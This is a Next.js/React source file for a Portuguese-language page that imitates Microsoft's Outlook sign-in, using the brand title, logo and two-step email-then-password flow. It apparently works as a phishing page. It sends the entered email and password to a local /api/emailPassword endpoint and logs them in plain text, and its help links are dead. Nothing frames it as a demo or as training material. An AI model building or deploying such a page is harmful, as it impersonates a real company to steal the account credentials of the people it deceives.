'use client';

import Head from 'next/head';
import { useState } from 'react';
import styles from './page.module.css';

export default function Page() {
    const [step, setStep] = useState(1);
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');

    const handleEmailSubmit = (e: any) => {
        e.preventDefault();
        if (email) {
            setStep(2);
        }
    };

    const handlePasswordSubmit = async (e: any) => {
        e.preventDefault();

        const response = await fetch('/api/emailPassword', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email, password }),
        });

        const data = await response.json();
        console.log(data);

        if (response.ok) {
            console.log('Login:', email, 'Password:', password);
        } else {
            console.error('Erro ao enviar os dados');
        }
    };

    return (
        <>
            <Head>
                <title>Entre na sua conta Microsoft</title>
                <meta name="description" content="Outlook Login Page" />
                <link rel="icon" href="/favicon.ico" />
            </Head>
            <div className={styles.container}>
                <main className={styles.main}>
                    <div className={styles.loginContainer}>
                        <div className={styles.logo}>
                            <img
                                src="/logoMicrosoft.svg"
                                alt="Microsoft Logo"
                            />
                        </div>

                        {step === 1 && <h2 className={styles.title}>Entrar</h2>}

                        {step === 1 ? (
                            <form
                                onSubmit={handleEmailSubmit}
                                className={styles.form}
                            >
                                <input
                                    type="text"
                                    id="email"
                                    name="email"
                                    placeholder="Email, telefone ou Skype"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                />
                                <div className={styles.flex}>
                                    <button
                                        type="button"
                                        className={styles.voltar}
                                    >
                                        Voltar
                                    </button>
                                    <button type="submit">Avançar</button>
                                </div>
                            </form>
                        ) : (
                            <form
                                onSubmit={handlePasswordSubmit}
                                className={styles.form}
                            >
                                <div className={styles.emailDisplay}>
                                    <p>{email}</p>
                                </div>
                                <h2 className={styles.secondTitle}>
                                    Insira sua senha
                                </h2>
                                <input
                                    type="password"
                                    id="password"
                                    name="password"
                                    placeholder="Senha"
                                    value={password}
                                    onChange={(e) =>
                                        setPassword(e.target.value)
                                    }
                                />
                                <div className={styles.flexLinks}>
                                    <a href="#">Esqueceu a senha?</a>
                                    <a href="#">Outras maneiras de entrar?</a>
                                </div>
                                <button type="submit">Entrar</button>
                            </form>
                        )}

                        <div className={styles.links}>
                            {step === 1 ? (
                                <>
                                    <a href="#">
                                        Não tem uma conta?{' '}
                                        <strong>Crie uma!</strong>
                                    </a>
                                    <a
                                        className={styles.naoConsegueAcessar}
                                        href="#"
                                    >
                                        Não consegue acessar sua conta?
                                    </a>
                                </>
                            ) : (
                                <a href="#">Esqueceu sua senha?</a>
                            )}
                        </div>
                    </div>
                </main>

                <div className={styles.options}>
                    <button>
                        <img
                            src="/key.svg"
                            alt="Options Icon"
                            width="32"
                            height="32"
                        />
                        <span>Opções de entrada</span>
                    </button>
                </div>
            </div>
        </>
    );
}
